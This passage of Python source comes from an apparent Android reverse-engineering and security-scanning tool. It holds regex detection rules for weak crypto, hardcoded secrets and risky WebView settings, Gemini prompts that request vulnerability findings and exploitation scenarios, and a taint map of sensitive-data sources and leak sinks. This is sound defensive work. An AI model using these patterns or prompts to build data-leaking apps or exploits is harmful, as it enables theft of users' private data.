        (r'api[_-]?key\s*=\s*"[^"]+"', 'Hardcoded API Key', 'high', 'Hardcoded API key detected'),
        (r'secret\s*=\s*"[^"]+"', 'Hardcoded Secret', 'high', 'Hardcoded secret value detected'),
        (r'token\s*=\s*"[A-Za-z0-9+/=]{20,}"', 'Hardcoded Token', 'high', 'Hardcoded authentication token'),
        
        # ========== M5: Insufficient Cryptography ==========
        (r'SecretKeySpec\s*\([^,]+,\s*"DES"', 'Weak Crypto DES', 'high', 'Using weak DES encryption - use AES instead'),
        (r'Cipher\.getInstance\s*\(\s*"DES', 'DES Cipher', 'high', 'DES cipher is deprecated and weak'),
        (r'Cipher\.getInstance\s*\(\s*"AES/ECB', 'ECB Mode', 'high', 'ECB mode leaks patterns - use GCM or CBC'),
        (r'Cipher\.getInstance\s*\(\s*"AES"\s*\)', 'AES Default Mode', 'medium', 'AES without mode defaults to ECB'),
        (r'Cipher\.getInstance\s*\(\s*"RC4', 'RC4 Cipher', 'high', 'RC4 is broken - do not use'),
        (r'Cipher\.getInstance\s*\(\s*"Blowfish', 'Blowfish Cipher', 'medium', 'Blowfish is outdated - use AES'),
        (r'MessageDigest\.getInstance\s*\(\s*"MD5"', 'MD5 Hash', 'high', 'MD5 is broken for security purposes'),
        (r'MessageDigest\.getInstance\s*\(\s*"SHA-1"', 'SHA1 Hash', 'medium', 'SHA-1 is deprecated - use SHA-256+'),
        (r'new\s+Random\s*\(\)', 'Weak Random', 'high', 'Using non-cryptographic Random - use SecureRandom'),
        (r'Math\.random\s*\(\)', 'Math Random', 'high', 'Math.random is not cryptographically secure'),
        (r'IvParameterSpec\s*\([^)]*new byte\[\]\s*\{0', 'Zero IV', 'critical', 'Using zero/static IV - breaks encryption security'),
        (r'SecretKeySpec\s*\([^)]*"[^"]+"\s*\.getBytes', 'Static Key', 'critical', 'Using static/hardcoded encryption key'),
        (r'KeyGenerator\.getInstance.*\.init\s*\(\s*(56|64|128)\s*\)', 'Weak Key Size', 'medium', 'Verify encryption key size is adequate'),
        
        # ========== M6: Insecure Authorization ==========
        (r'ContentProvider.*exported.*true', 'Exported Provider', 'high', 'Exported ContentProvider - verify permissions'),
        (r'grantUriPermission', 'URI Permission Grant', 'medium', 'Granting URI permissions - verify scope'),
        (r'checkCallingPermission.*PERMISSION_DENIED', 'Permission Check', 'info', 'Permission check implementation'),
        (r'enforceCallingPermission', 'Enforce Permission', 'info', 'Permission enforcement present'),
        
        # ========== M7: Client Code Quality ==========
        (r'WebView.*setJavaScriptEnabled\s*\(\s*true', 'JavaScript Enabled', 'medium', 'WebView with JavaScript - XSS risk if loading untrusted content'),
        (r'addJavascriptInterface', 'JavaScript Interface', 'high', 'WebView JavaScript bridge - code execution risk on API < 17'),
        (r'loadUrl\s*\([^)]*getIntent\(\)', 'Intent URL Loading', 'critical', 'Loading URLs from intent - injection vulnerability'),
        (r'loadUrl\s*\([^)]*\+', 'Dynamic URL Loading', 'high', 'Dynamic URL construction - verify input validation'),
        (r'evaluateJavascript\s*\([^)]*\+', 'JS Evaluation', 'high', 'Dynamic JavaScript evaluation - XSS risk'),
        (r'setAllowFileAccess\s*\(\s*true', 'WebView File Access', 'high', 'WebView file access enabled - local file theft risk'),
        (r'setAllowUniversalAccessFromFileURLs\s*\(\s*true', 'Universal File Access', 'critical', 'Universal file access in WebView - critical vulnerability'),
        (r'setAllowFileAccessFromFileURLs\s*\(\s*true', 'File URL Access', 'high', 'File URL access enabled - security risk'),
        
        # ========== M8: Code Tampering ==========
        (r'getPackageInfo\s*\([^)]*GET_SIGNATURES', 'Signature Check', 'info', 'App signature verification - anti-tampering'),
        (r'checkSignatures', 'Signature Comparison', 'info', 'Signature comparison for integrity'),
        (r'PackageManager\.GET_SIGNING_CERTIFICATES', 'Certificate Check', 'info', 'Certificate verification present'),
        
        # ========== M9: Reverse Engineering ==========
        (r'BuildConfig\.DEBUG', 'Debug Check', 'low', 'Debug build check - may expose debug functionality'),
        (r'android\.os\.Debug\.isDebuggerConnected', 'Debugger Detection', 'info', 'Debugger detection implemented'),
        (r'Debug\.waitingForDebugger', 'Debug Wait', 'info', 'Waiting for debugger attachment'),
        
        # ========== M10: Extraneous Functionality ==========
        (r'Log\.(d|v|i|w|e)\s*\(', 'Logging', 'low', 'Logging present - verify no sensitive data'),
        (r'System\.out\.print', 'System Print', 'low', 'System.out print - remove in production'),
        (r'printStackTrace\(\)', 'Stack Trace', 'low', 'Printing stack traces - information disclosure'),
        (r'Throwable.*getMessage\(\)', 'Exception Message', 'low', 'Exception messages may leak information'),
        
        # ========== Additional Security Patterns ==========
        (r'intent\.getStringExtra', 'Intent String Extra', 'info', 'Reading intent extras - validate input'),
        (r'getIntent\(\)\.getData\(\)', 'Intent Data', 'medium', 'Reading intent data URI - validate source'),
        (r'Class\.forName\s*\([^)]*\+', 'Dynamic Class Loading', 'high', 'Dynamic class loading - code injection risk'),
        (r'DexClassLoader|PathClassLoader', 'Custom ClassLoader', 'high', 'Custom class loader - verify loaded code source'),
        (r'ContentResolver.*query.*ContactsContract', 'Contacts Access', 'info', 'Accessing contacts data'),
        (r'ContentResolver.*query.*CallLog', 'Call Log Access', 'medium', 'Accessing call log data'),
        (r'SmsManager\.sendTextMessage', 'SMS Sending', 'medium', 'Sending SMS - verify user consent'),
        (r'TelephonyManager.*getDeviceId', 'Device ID Access', 'medium', 'Accessing device ID - privacy concern'),
        (r'LocationManager.*requestLocationUpdates', 'Location Tracking', 'medium', 'Location tracking - verify user consent'),
        (r'Camera\.open|CameraManager', 'Camera Access', 'medium', 'Camera access - verify user consent'),
        (r'MediaRecorder.*setAudioSource', 'Audio Recording', 'medium', 'Audio recording - verify user consent'),
        (r'ClipboardManager.*getPrimaryClip', 'Clipboard Read', 'medium', 'Reading clipboard - may contain sensitive data'),
        (r'createSocket.*\d+\.\d+\.\d+\.\d+', 'Hardcoded IP', 'medium', 'Hardcoded IP address detected'),
        (r'InetAddress\.getByName\s*\([^)]*"[^"]*\d+\.\d+\.\d+\.\d+', 'Hardcoded IP Address', 'medium', 'Hardcoded IP in network code'),
        (r'new\s+URL\s*\([^)]*"http:', 'Hardcoded HTTP URL', 'medium', 'Hardcoded HTTP URL - use HTTPS'),
        (r'@SuppressLint\s*\(\s*"[^"]*Security', 'Suppressed Security Lint', 'high', 'Security lint warning suppressed'),
        (r'catch\s*\(\s*Exception\s+\w+\s*\)\s*\{\s*\}', 'Empty Catch', 'medium', 'Empty exception handler - may hide errors'),
        (r'TODO|FIXME|HACK|XXX', 'Code Comment', 'low', 'Development comment found - review before release'),
    ]
    
    # Context patterns that indicate false positives (comments, strings, disabled code)
    false_positive_contexts = [
        r'^\s*//',           # Single-line comment
        r'^\s*\*',           # Multi-line comment
        r'^\s*/\*',          # Start of multi-line comment
        r'//.*$',            # Inline comment at end
        r'@Deprecated',      # Deprecated annotation context
        r'@Suppress',        # Suppression annotations
        r'if\s*\(\s*false\s*\)',  # Dead code
        r'if\s*\(\s*BuildConfig\.DEBUG',  # Debug-only code
        r'"[^"]*%s[^"]*"',   # Format strings
        r'\.toString\(\)',   # toString() context often safe
    ]
    
    # Patterns that are only vulnerabilities in specific contexts
    context_required_patterns = {
        'Cleartext HTTP': lambda line, code: (
            'http://' in line.lower() and 
            not any(x in line.lower() for x in ['localhost', '127.0.0.1', '10.0.2.2', 'example.com', 'schema', 'xmlns', '"//"']) and
            not re.search(r'https?://', line)  # Already has https reference
        ),
        'Logging': lambda line, code: (
            re.search(r'Log\.(d|v|i|w|e)\s*\([^,]*,\s*[^"]*password|Log\.(d|v|i|w|e)\s*\([^,]*,\s*[^"]*token|Log\.(d|v|i|w|e)\s*\([^,]*,\s*[^"]*secret', line, re.IGNORECASE)
        ),
        'Weak Random': lambda line, code: (
            'new Random()' in line and 
            any(x in code.lower() for x in ['encrypt', 'cipher', 'secret', 'token', 'key', 'nonce', 'iv'])
        ),
        'Math Random': lambda line, code: (
            'Math.random()' in line and
            any(x in code.lower() for x in ['encrypt', 'cipher', 'secret', 'token', 'key', 'password'])
        ),
        'Hardcoded Password': lambda line, code: (
            re.search(r'password\s*=\s*"[^"]+"', line, re.IGNORECASE) and
            not any(x in line.lower() for x in ['hint', 'placeholder', 'example', 'test', 'mock', 'fake', 'dummy', 'sample', '""', '"password"'])
        ),
        'Hardcoded API Key': lambda line, code: (
            re.search(r'api[_-]?key\s*=\s*"[^"]+"', line, re.IGNORECASE) and
            len(re.findall(r'"([^"]+)"', line)[0] if re.findall(r'"([^"]+)"', line) else '') > 10
        ),
        'Hardcoded Secret': lambda line, code: (
            re.search(r'secret\s*=\s*"[^"]+"', line, re.IGNORECASE) and
            not any(x in line.lower() for x in ['client_secret', 'secret_key', 'test', 'mock', 'example', '""'])
        ),
    }
    
    for pattern, issue_type, severity, description in patterns:
        if re.search(pattern, source_code, re.IGNORECASE):
            # Find line number
            for i, line in enumerate(source_code.split('\n'), 1):
                if re.search(pattern, line, re.IGNORECASE):
                    # Skip if in a comment or false positive context
                    is_false_positive = False
                    for fp_pattern in false_positive_contexts:
                        if re.search(fp_pattern, line):
                            is_false_positive = True
                            break
                    
                    if is_false_positive:
                        continue
                    
                    # Check context-specific validation
                    if issue_type in context_required_patterns:
                        validator = context_required_patterns[issue_type]
                        if not validator(line, source_code):
                            continue
                    
                    # Skip low-severity info findings entirely to reduce noise
                    if severity == 'info':
                        continue
                    
                    # Skip low-severity findings for common patterns
                    if severity == 'low' and issue_type in ['Logging', 'System Print', 'Stack Trace', 'Exception Message', 'Code Comment', 'Debug Check']:
                        continue
                    
                    issues.append({
                        'type': issue_type,
                        'severity': severity,
                        'description': description,
                        'class': class_name,
                        'line': i,
                        'code_snippet': line.strip()[:100]
                    })
                    break
    
    return issues


# ============================================================================
# AI Code Analysis Functions
# ============================================================================

async def explain_code_with_ai(
    source_code: str,
    class_name: str,
    explanation_type: str = "general",
    method_name: Optional[str] = None
) -> Dict[str, Any]:
    """
    Use Gemini AI to explain decompiled Java/Kotlin code.
    
    Args:
        source_code: The decompiled source code
        class_name: Name of the class being analyzed
        explanation_type: Type of explanation (general, security, method)
        method_name: Optional method name for method-specific explanation
    
    Returns:
        Dictionary with explanation, key points, and security concerns
    """
    from google import genai
    from google.genai import types
    import json
    
    client = genai.Client(api_key=settings.gemini_api_key)
    
    # Truncate very long source code
    max_code_length = 15000
    if len(source_code) > max_code_length:
        source_code = source_code[:max_code_length] + "\n\n// ... [truncated for analysis]"
    
    if explanation_type == "method" and method_name:
        prompt = f"""You are an expert Android reverse engineer. Analyze this specific method from decompiled Java/Android code.

Class: {class_name}
Method: {method_name}

```java
{source_code}
```

Provide a detailed analysis in the following JSON format:
{{
    "explanation": "Clear explanation of what this method does, its purpose, and how it works (2-4 paragraphs)",
    "key_points": [
        "Key point 1 about the method's functionality",
        "Key point 2 about inputs/outputs",
        "Key point 3 about side effects or behavior"
    ],
    "security_concerns": [
        {{
            "concern": "Security concern description",
            "severity": "high/medium/low",
            "line_hint": "relevant code pattern",
            "recommendation": "How to mitigate"
        }}
    ]
}}

Focus on:
1. What the method accomplishes
2. Input validation and data handling
3. Any security implications
4. Interaction with Android APIs"""

    elif explanation_type == "security":
        prompt = f"""You are an expert Android security researcher. Perform a security-focused analysis of this decompiled Java/Android code.

Class: {class_name}

```java
{source_code}
```

Provide a security analysis in the following JSON format:
{{
    "explanation": "Security-focused overview of what this class does and potential risks (2-3 paragraphs)",
    "key_points": [
        "Key security-relevant functionality 1",
        "Key security-relevant functionality 2",
        "Data handling patterns",
        "Permission usage"
    ],
    "security_concerns": [
        {{
            "concern": "Specific security vulnerability or concern",
            "severity": "critical/high/medium/low",
            "line_hint": "code pattern that indicates this",
            "recommendation": "How to exploit or mitigate"
        }}
    ]
}}

Focus on:
1. Sensitive data handling
2. Authentication/authorization
3. Cryptographic operations
4. Network communications
5. Intent handling and IPC
6. File operations
7. SQL queries
8. WebView usage"""

    else:  # general
        prompt = f"""You are an expert Android reverse engineer helping to understand decompiled Java/Android code.

Class: {class_name}

```java
{source_code}
```

Provide a clear explanation in the following JSON format:
{{
    "explanation": "Clear, detailed explanation of what this class does and its purpose (2-4 paragraphs). Explain as if to someone who wants to understand the app's behavior.",
    "key_points": [
        "Main purpose/responsibility of this class",
        "Key methods and what they do",
        "Data this class handles",
        "How it interacts with other components"
    ],
    "security_concerns": [
        {{
            "concern": "Any notable security concern",
            "severity": "high/medium/low",
            "line_hint": "relevant code pattern",
            "recommendation": "Mitigation suggestion"
        }}
    ]
}}

Consider:
1. Is this an Activity, Service, BroadcastReceiver, or ContentProvider?
2. What user-facing functionality does it provide?
3. What data does it process or store?
4. What Android APIs does it use?"""

    try:
        response = sync_gemini_request_with_retry(
            lambda: client.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=120.0,
            operation_name="AI code explanation"
        )
        
        if response is None:
            return {
                "class_name": class_name,
                "explanation_type": explanation_type,
                "explanation": "AI analysis timed out or failed after retries",
                "key_points": [],
                "security_concerns": [],
                "method_name": method_name
            }
        
        # Parse JSON from response
        response_text = response.text
        
        # Try to extract JSON
        json_match = re.search(r'\{[\s\S]*\}', response_text)
        if json_match:
            result = json.loads(json_match.group())
        else:
            # Fallback - create structured response from text
            result = {
                "explanation": response_text,
                "key_points": [],
                "security_concerns": []
            }
        
        return {
            "class_name": class_name,
            "explanation_type": explanation_type,
            "explanation": result.get("explanation", "Analysis complete."),
            "key_points": result.get("key_points", []),
            "security_concerns": result.get("security_concerns", []),
            "method_name": method_name
        }
        
    except Exception as e:
        logger.error(f"AI code explanation failed: {e}")
        return {
            "class_name": class_name,
            "explanation_type": explanation_type,
            "explanation": f"AI analysis failed: {str(e)}",
            "key_points": [],
            "security_concerns": [],
            "method_name": method_name
        }


async def analyze_code_vulnerabilities_with_ai(
    source_code: str,
    class_name: str
) -> Dict[str, Any]:
    """
    Use Gemini AI to perform deep vulnerability analysis on decompiled code.
    
    Args:
        source_code: The decompiled source code
        class_name: Name of the class being analyzed
    
    Returns:
        Dictionary with vulnerabilities, recommendations, and exploitation scenarios
    """
    from google import genai
    from google.genai import types
    import json
    
    client = genai.Client(api_key=settings.gemini_api_key)
    
    # Truncate very long source code
    max_code_length = 15000
    if len(source_code) > max_code_length:
        source_code = source_code[:max_code_length] + "\n\n// ... [truncated for analysis]"
    
    prompt = f"""You are an expert Android security researcher and penetration tester. Perform a comprehensive vulnerability analysis of this decompiled Android code.

Class: {class_name}

```java
{source_code}
```

Analyze for ALL potential security vulnerabilities and provide your findings in this JSON format:
{{
    "risk_level": "critical/high/medium/low/info",
    "summary": "Executive summary of security posture (2-3 sentences)",
    "vulnerabilities": [
        {{
            "id": "VULN-001",
            "title": "Vulnerability title",
            "severity": "critical/high/medium/low",
            "category": "OWASP category or type",
            "description": "Detailed description of the vulnerability",
            "affected_code": "The vulnerable code pattern or line",
            "impact": "What an attacker could achieve",
            "cvss_estimate": "Estimated CVSS score if applicable"
        }}
    ],
    "recommendations": [
        "Specific recommendation 1 with code fix suggestion",
        "Specific recommendation 2",
        "General security improvement"
    ],
    "exploitation_scenarios": [
        "Step-by-step exploitation scenario 1",
        "How an attacker could chain vulnerabilities"
    ]
}}

Check for vulnerabilities including:
1. **Injection Flaws**: SQL injection, command injection, LDAP injection
2. **Insecure Data Storage**: SharedPreferences, databases, files, logs
3. **Insecure Communication**: HTTP, certificate validation, hostname verification
4. **Insecure Authentication**: Weak passwords, hardcoded credentials, biometric bypass
5. **Insufficient Cryptography**: Weak algorithms, static keys, predictable IVs
6. **Insecure Authorization**: Exported components, permission issues
7. **Client Code Quality**: WebView vulnerabilities, JavaScript interfaces
8. **Code Tampering**: Missing integrity checks
9. **Reverse Engineering**: Debug code, logging sensitive data
10. **Extraneous Functionality**: Hidden backdoors, test code

Be thorough and identify ALL potential security issues, even low-severity ones."""

    try:
        response = sync_gemini_request_with_retry(
            lambda: client.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=120.0,
            operation_name="AI vulnerability analysis"
        )
        
        if response is None:
            return {
                "class_name": class_name,
                "risk_level": "error",
                "vulnerabilities": [],
                "recommendations": [],
                "exploitation_scenarios": [],
                "summary": "AI analysis timed out or failed after retries"
            }
        
        response_text = response.text
        
        # Try to extract JSON
        json_match = re.search(r'\{[\s\S]*\}', response_text)
        if json_match:
            result = json.loads(json_match.group())
        else:
            result = {
                "risk_level": "unknown",
                "summary": response_text[:500],
                "vulnerabilities": [],
                "recommendations": [],
                "exploitation_scenarios": []
            }
        
        return {
            "class_name": class_name,
            "risk_level": result.get("risk_level", "unknown"),
            "vulnerabilities": result.get("vulnerabilities", []),
            "recommendations": result.get("recommendations", []),
            "exploitation_scenarios": result.get("exploitation_scenarios", []),
            "summary": result.get("summary", "Analysis complete.")
        }
        
    except Exception as e:
        logger.error(f"AI vulnerability analysis failed: {e}")
        return {
            "class_name": class_name,
            "risk_level": "error",
            "vulnerabilities": [],
            "recommendations": [],
            "exploitation_scenarios": [],
            "summary": f"AI analysis failed: {str(e)}"
        }


# ============================================================================
# Data Flow Analysis
# ============================================================================

# Data sources - where sensitive data originates
DATA_SOURCES = {
    # User Input Sources
    "user_input": [
        r"getIntent\(\)",
        r"getExtras\(\)",
        r"getStringExtra\(",
        r"getBundleExtra\(",
        r"getParcelableExtra\(",
        r"getText\(\)",
        r"getEditableText\(\)",
        r"EditText.*\.getText\(",
        r"getClipboardManager\(\)",
        r"ClipData",
        r"onActivityResult\(",
        r"ContentResolver.*query\(",
    ],
    # File Sources
    "file_input": [
        r"FileInputStream",
        r"BufferedReader",
        r"InputStreamReader",
        r"openFileInput\(",
        r"getAssets\(\)\.open\(",
        r"getResources\(\)\.openRawResource\(",
        r"readFile\(",
        r"Files\.readAllBytes\(",
        r"Scanner.*new File\(",
    ],
    # Network Sources
    "network_input": [
        r"HttpURLConnection.*getInputStream\(",
        r"URLConnection.*getInputStream\(",
        r"Socket.*getInputStream\(",
        r"OkHttpClient",
        r"Retrofit",
        r"Volley",
        r"WebSocket.*onMessage\(",
        r"Response\.body\(",
    ],
    # Database Sources
    "database_input": [
        r"SQLiteDatabase.*query\(",
        r"rawQuery\(",
        r"Cursor.*getString\(",
        r"Cursor.*getInt\(",
        r"Room.*Dao",
        r"ContentProvider.*query\(",
    ],
    # Sensitive Data Sources
    "sensitive_data": [
        r"getDeviceId\(",
        r"getSubscriberId\(",
        r"getLine1Number\(",
        r"getSimSerialNumber\(",
        r"getMacAddress\(",
        r"getLastKnownLocation\(",
        r"getLatitude\(",
        r"getLongitude\(",
        r"AccountManager.*getAccounts\(",
        r"getInstalledPackages\(",
        r"SmsManager.*getAllMessagesFromIcc\(",
        r"ContactsContract",
        r"CalendarContract",
        r"MediaStore",
    ],
    # Crypto Sources
    "crypto_input": [
        r"SecretKey",
        r"PrivateKey",
        r"getEncoded\(",
        r"KeyStore.*getKey\(",
        r"Cipher.*doFinal\(",
    ],
}

# Data sinks - where data flows to (potential leakage points)
DATA_SINKS = {
    # Logging Sinks
    "logging": [
        r"Log\.[vdiwea]\(",
        r"System\.out\.print",
        r"System\.err\.print",
        r"printStackTrace\(",
        r"logger\.",
        r"Timber\.[dviwe]\(",
    ],
    # Network Sinks
    "network_output": [
        r"HttpURLConnection.*getOutputStream\(",
        r"URLConnection.*getOutputStream\(",
        r"Socket.*getOutputStream\(",
        r"DataOutputStream.*write",
        r"OutputStream.*write\(",
        r"OkHttpClient.*newCall\(",
        r"RequestBody\.create\(",
        r"WebSocket.*send\(",
    ],
    # File Sinks
    "file_output": [
        r"FileOutputStream",
        r"BufferedWriter",
        r"OutputStreamWriter",
        r"openFileOutput\(",
        r"FileWriter",
        r"Files\.write\(",
        r"PrintWriter",
    ],
    # Database Sinks
    "database_output": [
        r"SQLiteDatabase.*insert\(",
        r"SQLiteDatabase.*update\(",
        r"execSQL\(",
        r"ContentValues.*put\(",
        r"Room.*insert\(",
    ],
    # SharedPreferences Sinks
    "preferences": [
        r"SharedPreferences.*edit\(",
        r"putString\(",
        r"putInt\(",
        r"putBoolean\(",
        r"commit\(\)",
        r"apply\(\)",
    ],
    # IPC Sinks
    "ipc_output": [
        r"startActivity\(",
        r"startService\(",
        r"sendBroadcast\(",
        r"sendOrderedBroadcast\(",
        r"bindService\(",
        r"setResult\(",
        r"ContentResolver.*insert\(",
        r"ContentResolver.*update\(",
    ],
    # Clipboard Sinks
    "clipboard": [
        r"ClipboardManager.*setPrimaryClip\(",
        r"ClipData\.newPlainText\(",
    ],
    # WebView Sinks
    "webview": [
        r"loadUrl\(",
        r"loadData\(",
        r"evaluateJavascript\(",
        r"addJavascriptInterface\(",
    ],
}

# Taint propagation patterns - how data flows between variables
TAINT_PROPAGATORS = [
    r"(\w+)\s*=\s*(\w+)\.toString\(\)",
    r"(\w+)\s*=\s*String\.valueOf\((\w+)\)",
    r"(\w+)\s*=\s*(\w+)\s*\+",
    r"(\w+)\s*=\s*new\s+String\((\w+)\)",
    r"(\w+)\s*=\s*(\w+)\.getBytes\(",
    r"(\w+)\s*=\s*Base64\.encode\((\w+)",
    r"(\w+)\s*=\s*URLEncoder\.encode\((\w+)",
    r"(\w+)\s*=\s*(\w+)\.substring\(",
    r"(\w+)\s*=\s*(\w+)\.split\(",
    r"(\w+)\s*=\s*(\w+)\.trim\(",
    r"(\w+)\s*=\s*(\w+)\.toLowerCase\(",
    r"(\w+)\s*=\s*(\w+)\.toUpperCase\(",
    r"StringBuilder.*append\((\w+)\)",
    r"(\w+)\.put\([^,]+,\s*(\w+)\)",
]


def analyze_data_flow(source_code: str, class_name: str) -> Dict[str, Any]:
    """
    Analyze data flow in decompiled Java source code.
    
    Performs lightweight taint analysis to track:
    - Data sources (where sensitive data originates)
    - Data sinks (where data flows to)
    - Potential data leakage paths
    """
    results = {
        "class_name": class_name,
        "sources": [],
        "sinks": [],
        "flows": [],
        "risk_flows": [],
        "summary": {
            "total_sources": 0,
            "total_sinks": 0,
            "potential_leaks": 0,
            "risk_level": "low"
        }
    }
    
    lines = source_code.split('\n')
    
    # Track tainted variables (variable_name -> source_type, line)
    tainted_vars: Dict[str, tuple] = {}
    
    # Find all data sources
    for category, patterns in DATA_SOURCES.items():
        for pattern in patterns:
            for line_num, line in enumerate(lines, 1):
                matches = re.finditer(pattern, line)
                for match in matches:
                    # Try to find the variable being assigned
                    assign_match = re.search(r'(\w+)\s*=', line[:match.start()])
                    var_name = assign_match.group(1) if assign_match else None
                    
                    source_entry = {
                        "type": category,
                        "pattern": pattern,
                        "line": line_num,
                        "code": line.strip(),
                        "variable": var_name
                    }
                    results["sources"].append(source_entry)
                    
                    # Mark variable as tainted
                    if var_name:
                        tainted_vars[var_name] = (category, line_num)
    
    # Propagate taint through assignments
    for line_num, line in enumerate(lines, 1):
        for prop_pattern in TAINT_PROPAGATORS:
            prop_matches = re.finditer(prop_pattern, line)
            for match in prop_matches:
                groups = match.groups()
                if len(groups) >= 2:
                    target_var = groups[0]
                    source_var = groups[1]
                    if source_var in tainted_vars:
                        tainted_vars[target_var] = tainted_vars[source_var]
    
    # Find all data sinks and check if tainted data flows to them
    for category, patterns in DATA_SINKS.items():
        for pattern in patterns:
            for line_num, line in enumerate(lines, 1):
                matches = re.finditer(pattern, line)
                for match in matches:
                    sink_entry = {
                        "type": category,
                        "pattern": pattern,
                        "line": line_num,
                        "code": line.strip()
                    }
                    results["sinks"].append(sink_entry)
                    
                    # Check if any tainted variable is used in this sink
                    for var_name, (source_type, source_line) in tainted_vars.items():
                        if re.search(rf'\b{re.escape(var_name)}\b', line):
                            flow = {
                                "source": {
                                    "type": source_type,
                                    "variable": var_name,
                                    "line": source_line
                                },
                                "sink": {
                                    "type": category,
                                    "line": line_num,
                                    "code": line.strip()
                                },
                                "risk": _calculate_flow_risk(source_type, category)
                            }
                            results["flows"].append(flow)
                            
                            # Track high-risk flows separately
                            if flow["risk"] in ["high", "critical"]:
                                results["risk_flows"].append(flow)
    
    # Calculate summary
    results["summary"]["total_sources"] = len(results["sources"])
    results["summary"]["total_sinks"] = len(results["sinks"])
    results["summary"]["potential_leaks"] = len(results["risk_flows"])
    
    # Determine overall risk level
    critical_flows = sum(1 for f in results["flows"] if f["risk"] == "critical")
    high_flows = sum(1 for f in results["flows"] if f["risk"] == "high")
    
    if critical_flows > 0:
        results["summary"]["risk_level"] = "critical"
    elif high_flows > 0:
        results["summary"]["risk_level"] = "high"
    elif len(results["flows"]) > 5:
        results["summary"]["risk_level"] = "medium"
    else:
        results["summary"]["risk_level"] = "low"
    
    return results


def _calculate_flow_risk(source_type: str, sink_type: str) -> str:
    """Calculate the risk level of a data flow from source to sink."""
    # High-risk combinations
    critical_combinations = [
        ("sensitive_data", "network_output"),
        ("sensitive_data", "logging"),
        ("crypto_input", "logging"),
        ("crypto_input", "network_output"),
        ("user_input", "webview"),  # XSS risk
    ]
    
    high_risk_combinations = [
        ("sensitive_data", "file_output"),
        ("sensitive_data", "ipc_output"),
        ("database_input", "logging"),
        ("user_input", "database_output"),  # SQL injection risk
        ("network_input", "webview"),
        ("file_input", "webview"),
    ]
    
    medium_risk_combinations = [
        ("user_input", "logging"),
        ("database_input", "network_output"),
        ("file_input", "network_output"),
    ]
    
    combo = (source_type, sink_type)
    
    if combo in critical_combinations:
        return "critical"
    elif combo in high_risk_combinations:
        return "high"
    elif combo in medium_risk_combinations:
        return "medium"
    else:
        return "low"


# ============================================================================
# Method Call Graph Analysis
# ============================================================================

def build_call_graph(source_code: str, class_name: str) -> Dict[str, Any]:
    """
    Build a method call graph from decompiled Java source code.
    
    Extracts:
    - Method definitions and their signatures
    - Method calls within each method
    - Call relationships (caller -> callee)
    - Entry points (lifecycle methods, exported components)
    """
    results = {
        "class_name": class_name,
        "methods": [],
        "calls": [],
        "entry_points": [],
        "external_calls": [],
        "graph": {
            "nodes": [],
            "edges": []
        },
        "statistics": {
            "total_methods": 0,
            "total_internal_calls": 0,
            "total_external_calls": 0,
            "max_depth": 0,
            "cyclomatic_complexity": 0
        }
    }
    
    lines = source_code.split('\n')
    
    # Method definition patterns
    method_pattern = re.compile(
        r'(?:public|private|protected|static|final|native|synchronized|abstract|transient|\s)*'
        r'(?:<[\w\s,<>?]+>\s+)?'  # Generic types
        r'(\w+(?:<[\w\s,<>?]+>)?)\s+'  # Return type
        r'(\w+)\s*'  # Method name
        r'\(([^)]*)\)\s*'  # Parameters
        r'(?:throws\s+[\w\s,]+)?'  # Throws clause
        r'\s*\{'  # Opening brace
    )
    
    # Entry point patterns (Android lifecycle methods)
    entry_point_methods = {
        "onCreate", "onStart", "onResume", "onPause", "onStop", "onDestroy",
        "onCreateView", "onViewCreated", "onAttach", "onDetach",
        "onReceive", "onBind", "onStartCommand", "onHandleIntent",
        "onClick", "onLongClick", "onTouch", "onItemClick",
        "onOptionsItemSelected", "onCreateOptionsMenu",
        "handleMessage", "run", "call",
        "doInBackground", "onPreExecute", "onPostExecute",
        "query", "insert", "update", "delete", "getType",  # ContentProvider
        "onNewIntent", "onActivityResult",
    }
    
    # Parse methods
    current_method = None
    brace_count = 0
    method_start_line = 0
    method_body_lines = []
    
    for line_num, line in enumerate(lines, 1):
        # Check for method definition
        method_match = method_pattern.search(line)
        if method_match and brace_count == 0:
            return_type = method_match.group(1)
            method_name = method_match.group(2)
            params = method_match.group(3)
            
            # Skip constructors that look like class name
            if method_name == class_name.split('.')[-1]:
                method_name = "<init>"
            
            current_method = {
                "name": method_name,
                "return_type": return_type,
                "parameters": _parse_parameters(params),
                "line_start": line_num,
                "line_end": 0,
                "is_entry_point": method_name in entry_point_methods,
                "calls": [],
                "called_by": [],
                "modifiers": _extract_modifiers(line)
            }
            method_start_line = line_num
            method_body_lines = []
            brace_count = line.count('{') - line.count('}')
            
        elif current_method:
            method_body_lines.append(line)
            brace_count += line.count('{') - line.count('}')
            
            if brace_count == 0:
                current_method["line_end"] = line_num
                current_method["calls"] = _extract_method_calls(
                    '\n'.join(method_body_lines), 
                    class_name
                )
                results["methods"].append(current_method)
                
                if current_method["is_entry_point"]:
                    results["entry_points"].append({
                        "name": current_method["name"],
                        "line": current_method["line_start"],
                        "type": _get_entry_point_type(current_method["name"])
                    })
                
                current_method = None
    
    # Build call relationships
    method_names = {m["name"] for m in results["methods"]}
    
    for method in results["methods"]:
        for call in method["calls"]:
            call_entry = {
                "caller": method["name"],
                "caller_line": method["line_start"],
                "callee": call["method"],
                "callee_class": call.get("class", class_name),
                "line": call["line"],
                "is_internal": call["method"] in method_names
            }
            
            results["calls"].append(call_entry)
            
            if not call_entry["is_internal"]:
                results["external_calls"].append(call_entry)
            
            # Add edge to graph
            results["graph"]["edges"].append({
                "from": method["name"],
                "to": call["method"],
                "label": f"line {call['line']}"
            })
    
    # Build graph nodes
    for method in results["methods"]:
        node = {
            "id": method["name"],
            "label": method["name"],
            "type": "internal",
            "is_entry_point": method["is_entry_point"],
            "line": method["line_start"]
        }
        results["graph"]["nodes"].append(node)
    
    # Add external method nodes
    external_methods = set()
    for call in results["external_calls"]:
        external_id = f"{call['callee_class']}.{call['callee']}"
        if external_id not in external_methods:
            external_methods.add(external_id)
            results["graph"]["nodes"].append({
                "id": external_id,
                "label": call["callee"],
                "type": "external",
                "is_entry_point": False,
                "class": call["callee_class"]
            })
    
    # Calculate statistics
    results["statistics"]["total_methods"] = len(results["methods"])
    results["statistics"]["total_internal_calls"] = sum(
        1 for c in results["calls"] if c["is_internal"]
    )
    results["statistics"]["total_external_calls"] = len(results["external_calls"])
